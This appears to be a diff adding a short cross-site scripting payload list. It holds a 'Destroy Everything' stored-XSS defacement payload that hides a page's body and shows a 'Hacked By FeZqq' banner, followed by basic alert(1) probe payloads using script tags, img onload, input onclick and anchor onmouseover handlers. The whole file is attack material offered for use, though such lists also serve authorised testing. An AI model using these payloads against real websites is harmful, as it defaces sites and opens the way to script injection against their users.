@@ -1,0 +1,16 @@
+Destroy Everything For Stored XSS (Use Carefully)
+-------------------------------------------------
+<style>html::before {content: "Hacked By FeZqq";} body {display: none;}</style>
+
+
+
+Basic Payloads For First Step
+-------------------------------------------------
+<script>alert(1)</script>
+<img src=validimage.png onload=alert(1)>
+<img srcset=validimage.png onload=alert(1)>
+<input onclick="alert(1)" style=display:block>test</input>
+<a onmouseover="alert(1)" style=display:block>test</a>
+
+
+
